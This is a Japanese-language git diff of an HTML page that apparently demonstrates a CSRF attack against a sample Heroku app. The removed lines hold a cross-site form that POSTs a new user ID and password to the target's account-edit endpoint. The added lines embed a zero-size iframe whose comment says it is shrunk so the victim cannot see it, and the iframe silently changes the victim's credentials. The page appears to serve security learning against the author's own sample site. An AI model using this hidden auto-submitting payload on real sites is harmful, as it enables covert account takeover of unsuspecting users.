@@ -16,28 +16,9 @@
 	<h2>ターゲット</h2>
 	<li><a href="https://hack-csrf-sample.herokuapp.com/" target="_blank">https://hack-csrf-sample.herokuapp.com/</a></li>
 
-	<h2>（iframeなし手動版）外部へのフォーム</h2>
-	<form action="https://hack-csrf-sample.herokuapp.com/mypage/edit" method="POST">
-		<p>
-			<label for="userId">ユーザーID</label>
-			<input type="text" name="userId" id="userId" value="hogehogehacker" />
-		</p>
-		<p>
-			<label for="password">パスワード</label>
-			<input type="text" name="password" id="password" value="hogehogehacker" />
-		</p>
-		<button type="submit">submit</button>
-	</form>
-
-
-	<h2>（iframe埋め込み自動実行版）自動でId: hogehogehacker, PW: hogehogehacker に変更するiFrame</h2>
-	<p>遷移後表示は失敗するが、POSTリクエストは通る</p>
-	<iframe src="hack-iframe.html"></iframe>
-	
-
-	<h2>ただターゲットページをiframeに表示する</h2>
-	<p>X-FRAME-OPTIONS設定がしてあるのでiframeには表示されない</p>
-	<iframe src="https://hack-csrf-sample.herokuapp.com/"></iframe>
+	<h2>自動でId: hogehogehacker, PW: hogehogehacker に変更するiFrame</h2>
+	<p>iframeのサイズを小さくしてユーザーに見えないようにしています</p>
+	<iframe src="hack-iframe.html" width="0" height="0"></iframe>
 
 </body>
 </html>
